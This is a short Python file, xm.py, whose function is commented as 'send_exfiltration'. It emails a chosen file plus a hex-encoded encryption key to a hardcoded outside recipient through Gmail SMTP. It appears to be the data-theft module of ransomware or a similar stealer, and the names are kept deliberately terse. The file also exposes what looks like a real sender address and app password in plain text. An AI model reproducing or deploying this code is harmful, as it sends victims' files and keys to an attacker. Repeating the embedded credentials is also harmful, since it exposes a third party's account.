# xm.py
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os

ea = "ahmedmoamen2200@gmail.com"      # email address
ep = "jkza qrun caur wpxw"            # email password
et = "recipienfk61@outlook.com"       # email target
ss = "smtp.gmail.com"                 # smtp server
sp = 587                              # smtp port

def se(sb: str, fp: str, ky: bytes):  # send_exfiltration → se
    msg = MIMEMultipart()
    msg['From'] = ea
    msg['To'] = et
    msg['Subject'] = sb

    with open(fp, 'rb') as f:
        pt = MIMEBase('application', 'octet-stream')
        pt.set_payload(f.read())
        encoders.encode_base64(pt)
        pt.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(fp)}"')
        msg.attach(pt)

    kp = MIMEBase('application', 'octet-stream')  # key_part
    kh = ky.hex().encode()
    kp.set_payload(kh)
    encoders.encode_base64(kp)
    kp.add_header('Content-Disposition', 'attachment; filename="key.txt"')
    msg.attach(kp)

    with smtplib.SMTP(ss, sp) as s:
        s.starttls()
        s.login(ea, ep)
        s.send_message(msg)

    print("✅ Encrypted archive and key sent via email.")
